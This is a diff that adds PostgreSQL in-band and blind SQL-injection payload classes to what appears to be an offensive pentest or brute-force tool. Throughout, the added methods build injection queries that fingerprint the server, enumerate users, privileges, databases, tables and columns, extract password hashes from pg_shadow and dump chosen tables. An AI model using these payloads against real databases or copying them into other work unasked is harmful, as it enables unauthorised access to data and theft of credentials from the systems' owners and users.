@@ -1123,4 +1123,149 @@ class MSSQL_Blind(SQLi_Base):
 
 # }}}
 
+# Postgres_Inband {{{
+class Postgres_Inband(SQLi_Base):
+
+  def banner(self):
+    return '(SELECT VERSION() X)a'
+
+  def current_user(self):
+    return '(SELECT CURRENT_USER X)a'
+
+  def current_db(self):
+    return '(SELECT CURRENT_DATABASE() X)a'
+
+  def hostname(self):
+    return '(SELECT CONCAT_WS(CHR(58),inet_server_addr(),inet_server_port()) X)a'
+
+  def enum_privileges(self, user):
+    if user:
+      c = "(SELECT COUNT(*) X FROM pg_user WHERE usename='%s')a" % user
+      q = "(SELECT CONCAT_WS(CHR(58),usecreatedb,usesuper) X FROM pg_user WHERE usename='%s' LIMIT ${row_count} OFFSET ${row_pos})a" % user
+    else:
+      c = '(SELECT COUNT(*) X FROM pg_user)a'
+      q = '(SELECT CONCAT_WS(CHR(58),usename,usecreatedb,usesuper) X FROM pg_user LIMIT ${row_count} OFFSET ${row_pos})a'
+    return c, q
+
+  def enum_users(self):
+    c = '(SELECT COUNT(DISTINCT(usename)) X FROM pg_user)a'
+    q = '(SELECT DISTINCT(usename) X FROM pg_user LIMIT ${row_count} OFFSET ${row_pos})a'
+    return c, q
+
+  def enum_passwords(self, user):
+    if user:
+      c = "(SELECT COUNT(*) X FROM pg_shadow WHERE usename='%s')a" % user
+      q = "(SELECT passwd X FROM pg_shadow WHERE usename='%s' LIMIT ${row_count} OFFSET ${row_pos})a" % user
+    else:
+      c = '(SELECT COUNT(*) X FROM pg_shadow)a'
+      q = '(SELECT CONCAT_WS(CHR(58),usename,passwd) X FROM pg_shadow LIMIT ${row_count} OFFSET ${row_pos})a'
+    return c, q
+
+  def enum_dbs(self):
+    c = '(SELECT COUNT(*) X FROM pg_database)a'
+    q = '(SELECT datname X FROM pg_database LIMIT ${row_count} OFFSET ${row_pos})a'
+    return c, q
+
+  def enum_tables(self, db):
+    if db:
+      c = "(SELECT COUNT(*) X FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() AND tableowner='%s')a" % db
+      q = "(SELECT tablename X FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() AND tableowner='%s' LIMIT ${row_count} OFFSET ${row_pos})a" % db
+
+    else:
+      c = "(SELECT COUNT(*) X FROM pg_tables WHERE schemaname=CURRENT_SCHEMA())a"
+      q = "(SELECT CONCAT_WS(CHR(58),tableowner,tablename) X FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() LIMIT ${row_count} OFFSET ${row_pos})a"
+    return c, q
+
+  def enum_columns(self, db, table):
+    if table:
+        c = "(SELECT COUNT(*) X FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s')a" % table
+        q = "(SELECT CONCAT_WS(CHR(58),attname) X FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s' LIMIT ${row_count} OFFSET ${row_pos})a" % table
+
+    else:
+      c = "(SELECT COUNT(*) X FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND nspname=CURRENT_SCHEMA())a"
+      q = "(SELECT CONCAT_WS(CHR(58),a.relname,attname) X FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND nspname=CURRENT_SCHEMA() LIMIT ${row_count} OFFSET ${row_pos})a"
+    return c, q
+
+  def dump_table(self, db, table, cols):
+    if not (table and cols):
+      raise NotImplementedError('-T and -C required')
+
+    c = '(SELECT COUNT(*) X FROM %s)a' % table
+    q = '(SELECT CONCAT_WS(CHR(58),%s) X FROM %s LIMIT ${row_count} OFFSET ${row_pos})a' % (','.join(cols.split(',')), table)
+    return c, q
+
+# }}}
+
+# Postgres_Blind {{{
+class Postgres_Blind(SQLi_Base):
+
+  def banner(self):
+    return 'SELECT VERSION()'
+
+  def current_user(self):
+    return 'SELECT CURRENT_USER'
+
+  def current_db(self):
+    return 'SELECT CURRENT_DATABASE()'
+
+  def hostname(self):
+    return 'SELECT CONCAT_WS(CHR(58),inet_server_addr(),inet_server_port())'
+
+  def enum_privileges(self, user):
+    if not user:
+      raise NotImplementedError('-U required')
+
+    c = "SELECT COUNT(*) FROM pg_user WHERE usename='%s'" % user
+    q = "SELECT CONCAT_WS(CHR(58),usecreatedb,usesuper) FROM pg_user WHERE usename='%s' LIMIT 1 OFFSET ${row_pos}" % user
+    return c, q
+
+  def enum_users(self):
+    c = 'SELECT COUNT(DISTINCT(usename)) FROM pg_user'
+    q = 'SELECT DISTINCT(usename) FROM pg_user LIMIT 1 OFFSET ${row_pos}'
+    return c, q
+
+  def enum_passwords(self, user):
+    if user:
+      c = "SELECT COUNT(*) FROM pg_shadow WHERE usename='%s'" % user
+      q = "SELECT passwd FROM pg_shadow WHERE usename='%s' LIMIT 1 OFFSET ${row_pos}" % user
+    else:
+      c = 'SELECT COUNT(*) FROM pg_shadow'
+      q = 'SELECT CONCAT_WS(CHR(58),usename,passwd) FROM pg_shadow LIMIT 1 OFFSET ${row_pos}'
+    return c, q
+
+  def enum_dbs(self):
+    c = 'SELECT COUNT(*) FROM pg_database'
+    q = 'SELECT datname FROM pg_database LIMIT 1 OFFSET ${row_pos}'
+    return c, q
+
+  def enum_tables(self, db):
+    if db:
+      c = "SELECT COUNT(*) FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() AND tableowner='%s'" % db
+      q = "SELECT tablename FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() AND tableowner='%s' LIMIT 1 OFFSET ${row_pos}" % db
+
+    else:
+      c = "SELECT COUNT(*) FROM pg_tables WHERE schemaname=CURRENT_SCHEMA()"
+      q = "SELECT CONCAT_WS(CHR(58),tableowner,tablename) FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() LIMIT 1 OFFSET ${row_pos}"
+    return c, q
+
+  def enum_columns(self, db, table):
+    if table:
+        c = "SELECT COUNT(*) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s'" % table
+        q = "SELECT CONCAT_WS(CHR(58),attname) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s' LIMIT 1 OFFSET ${row_pos}" % table
+
+    else:
+      c = "SELECT COUNT(*) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND nspname=CURRENT_SCHEMA()"
+      q = "SELECT CONCAT_WS(CHR(58),a.relname,attname) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND nspname=CURRENT_SCHEMA() LIMIT 1 OFFSET ${row_pos}"
+    return c, q
+
+  def dump_table(self, db, table, cols):
+    if not (table and cols):
+      raise NotImplementedError('-T and -C required')
+
+    c = 'SELECT COUNT(*) FROM %s' % table
+    q = 'SELECT CONCAT_WS(CHR(58),%s) FROM %s LIMIT 1 OFFSET ${row_pos}' % (','.join(cols.split(',')), table)
+    return c, q
+
+# }}}
+
 # vim: ts=2 sw=2 sts=2 et fdm=marker
